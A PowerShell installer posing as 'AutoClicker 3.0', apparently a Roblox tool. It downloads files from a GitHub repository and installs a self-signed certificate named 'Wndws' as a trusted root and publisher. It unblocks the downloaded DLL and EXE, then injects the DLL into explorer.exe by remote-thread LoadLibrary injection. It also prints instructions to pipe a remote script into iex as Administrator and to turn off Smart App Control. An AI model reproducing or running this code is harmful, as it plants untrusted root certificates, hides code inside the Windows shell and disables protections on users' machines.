# AutoClicker 3.0 public installer — download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:HostDllUrl = "$script:BaseUrl/AutoClickerHost.dll"
$script:HostDllName = 'AutoClickerHost.dll'
$script:HostProcessName = 'explorer'
$script:PublicInjectorReady = $false
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefaultInstallDirectory {
    $localApp = Join-Path $env:LOCALAPPDATA 'AutoClicker'
    if (-not [string]::IsNullOrWhiteSpace($localApp)) {
        return $localApp
    }
    return Join-Path $env:USERPROFILE 'Downloads'
}

function Get-DownloadsDirectory {
    $candidates = @(
        (Join-Path $env:USERPROFILE 'Downloads')
    )

    if ($env:OneDrive) {
        $candidates += Join-Path $env:OneDrive 'Downloads'
    }

    $profile = [Environment]::GetFolderPath('UserProfile')
    if ($profile) {
        $candidates += Join-Path $profile 'Downloads'
    }

    foreach ($path in ($candidates | Select-Object -Unique)) {
        if (-not [string]::IsNullOrWhiteSpace($path) -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }

    $fallback = Join-Path $env:USERPROFILE 'Downloads'
    if (-not (Test-Path -LiteralPath $fallback)) {
        New-Item -ItemType Directory -Force -Path $fallback | Out-Null
    }
    return $fallback
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DefaultInstallDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Write-LaunchBlockedHelp {
    param([string]$ExePath)

    Write-Host ''
    Write-Host '  Windows Application Control blocked the launch.' -ForegroundColor Yellow
    Write-Host '  The file downloaded and the signature verified — only execution was blocked.' -ForegroundColor DarkGray
    Write-Host ''
    Write-Host "  Saved EXE: $ExePath" -ForegroundColor White
    Write-Host ''
    Write-Host '  Try these (in order):' -ForegroundColor Cyan
    Write-Host '    1. Re-run installer as Administrator (trusts cert machine-wide):' -ForegroundColor White
    Write-Host '       irm https://raw.githubusercontent.com/JustValkz/Myst/main/install-public.ps1 | iex' -ForegroundColor DarkGray
    Write-Host '       (Right-click PowerShell -> Run as administrator, then paste)' -ForegroundColor DarkGray
    Write-Host '    2. Double-click the EXE in File Explorer (same folder as above).' -ForegroundColor White
    Write-Host '    3. Windows 11 Smart App Control: Settings -> Privacy & security ->' -ForegroundColor White
    Write-Host '       Windows Security -> App & browser control -> Smart App Control settings -> Off' -ForegroundColor DarkGray
    Write-Host '    4. School/work PC: IT AppLocker/WDAC may block all non-store apps — use private DLL instead.' -ForegroundColor White
    Write-Host ''
}

function Get-SmartAppControlState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        return [string]$status.SmartAppControlState
    } catch {
        return $null
    }
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsCert {
    param([string]$StoreRoot)

    Get-ChildItem "$StoreRoot\Root" -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $rootPath = "$StoreRoot\Root"
    $leafPath = "$StoreRoot\$LeafStore"

    if (-not (Get-TrustedWndwsCert -StoreRoot $StoreRoot)) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $rootPath | Out-Null
    }

    $existingPublisher = Get-ChildItem $leafPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1

    if (-not $existingPublisher) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $leafPath | Out-Null
    }
}

function Install-WndwsTrustedPublisher {
    param([string]$CerPath)

    Write-Step 'Installing Wndws publisher certificate (Current User)...'
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'

    if (Test-IsAdministrator) {
        Write-Step 'Installing Wndws publisher certificate (Local Machine)...' 'Green'
        Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    } else {
        Write-Step 'Tip: run PowerShell as Administrator once so Windows trusts Wndws machine-wide.' 'Yellow'
    }

    $trusted = Get-TrustedWndwsCert -StoreRoot 'Cert:\CurrentUser'
    if ($trusted) {
        Write-Step 'Wndws certificate trusted (Root + Publisher).' 'Green'
        return $trusted
    }

    throw 'Failed to install Wndws publisher certificate.'
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0
    )

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    if (Test-Path -LiteralPath $Destination) {
        Remove-Item -LiteralPath $Destination -Force
    }
    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing

    if ($MinBytes -gt 0 -and (Get-Item -LiteralPath $Destination).Length -lt $MinBytes) {
        throw "Download looks too small or corrupt: $Destination"
    }
}

function Initialize-PublicInjectorType {
    if ($script:PublicInjectorReady) { return }
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class PublicInjector {
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

    [StructLayout(LayoutKind.Sequential)]
    public struct MODULEENTRY32 {
        public uint dwSize;
        public uint th32ModuleID;
        public uint th32ProcessID;
        public uint GlblcntUsage;
        public uint ProccntUsage;
        public IntPtr modBaseAddr;
        public uint modBaseSize;
        public IntPtr hModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExePath;
    }

    public static bool Inject(int pid, string dllPath) {
        IntPtr h = OpenProcess(0x1F0FFF, false, pid);
        if (h == IntPtr.Zero) return false;
        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), 0x3000, 0x4);
        if (a == IntPtr.Zero) { CloseHandle(h); return false; }
        byte[] b = System.Text.Encoding.Unicode.GetBytes(dllPath);
        uint w;
        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return false; }
        IntPtr k = GetModuleHandle("kernel32.dll");
        IntPtr l = GetProcAddress(k, "LoadLibraryW");
        IntPtr t = CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
        if (t == IntPtr.Zero) { CloseHandle(h); return false; }
        WaitForSingleObject(t, 0xFFFFFFFF);
        CloseHandle(t);
        CloseHandle(h);
        return true;
    }

    public static bool HasModule(int pid, string dllPath) {
        string target = dllPath.Replace('/', '\\').ToLowerInvariant();
        IntPtr snap = CreateToolhelp32Snapshot(0x8, (uint)pid);
        if (snap == IntPtr.Zero) return false;
        MODULEENTRY32 me = new MODULEENTRY32();
        me.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));
        bool found = false;
        if (Module32First(snap, ref me)) {
            do {
                if (!string.IsNullOrEmpty(me.szExePath) && me.szExePath.Replace('/', '\\').ToLowerInvariant() == target) {
                    found = true;
                    break;
                }
            } while (Module32Next(snap, ref me));
        }
        CloseHandle(snap);
        return found;
    }
}
'@ -ErrorAction Stop
    $script:PublicInjectorReady = $true
}

function Get-ExplorerInjectionTarget {
    param([string]$DllPath)

    foreach ($proc in Get-Process -Name $script:HostProcessName -ErrorAction SilentlyContinue) {
        try {
            if (-not [PublicInjector]::HasModule($proc.Id, $DllPath)) {
                return $proc
            }
        } catch {}
    }
    return $null
}

function Invoke-PublicHostLoad {
    param([string]$DllPath)

    Initialize-PublicInjectorType
    $target = Get-ExplorerInjectionTarget -DllPath $DllPath
    if (-not $target) {
        foreach ($proc in Get-Process -Name $script:HostProcessName -ErrorAction SilentlyContinue) {
            $target = $proc
            break
        }
    }
    if (-not $target) {
        throw 'Explorer shell is not running.'
    }

    if ([PublicInjector]::HasModule($target.Id, $DllPath)) {
        Write-Step "AutoClicker host already loaded in Explorer (PID $($target.Id))." 'Green'
        return $true
    }

    Write-Step "Loading AutoClicker host into Explorer (PID $($target.Id))..." 'Cyan'
    if (-not [PublicInjector]::Inject($target.Id, $DllPath)) {
        throw 'Failed to inject AutoClicker host into Explorer.'
    }

    Start-Sleep -Seconds 2
    if (-not [PublicInjector]::HasModule($target.Id, $DllPath)) {
        throw 'Injection completed but AutoClickerHost.dll was not found in Explorer.'
    }

    Write-Step 'AutoClicker host loaded.' 'Green'
    return $true
}

function Test-PublicOverlayStarted {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class PublicOverlayProbe {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@ -ErrorAction SilentlyContinue

    for ($i = 0; $i -lt 12; $i++) {
        $hwnd = [PublicOverlayProbe]::FindWindow('AutoClickerOverlay', $null)
        if ($hwnd -ne [IntPtr]::Zero) {
            Write-Step 'AutoClicker overlay detected.' 'Green'
            return $true
        }
        Start-Sleep -Seconds 1
    }
    Write-Step 'Host loaded — open Roblox and use Insert if the license screen already passed.' 'Yellow'
    return $false
}

Write-Host ''
Write-Host '  AutoClicker 3.0' -ForegroundColor White
Write-Host ''

$sacState = Get-SmartAppControlState
if ($sacState -eq 'On') {
    Write-Step 'Smart App Control is ON — self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
}

Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName
$hostDllPath = Join-Path $InstallDir $script:HostDllName

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedPublisher -CerPath $cerPath

Save-Download -Url $script:HostDllUrl -Destination $hostDllPath -MinBytes 65536
Unblock-File -LiteralPath $hostDllPath -ErrorAction SilentlyContinue

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified signed package: $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
Write-Step "Host DLL: $hostDllPath" 'Green'
Write-Step "Signed EXE (manual fallback): $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Starting AutoClicker 3.0 host...' 'Cyan'
    Invoke-PublicHostLoad -DllPath $hostDllPath | Out-Null
    Test-PublicOverlayStarted | Out-Null
}

Write-Host ''
Write-Host '  Done.' -ForegroundColor Green
Write-Host ''
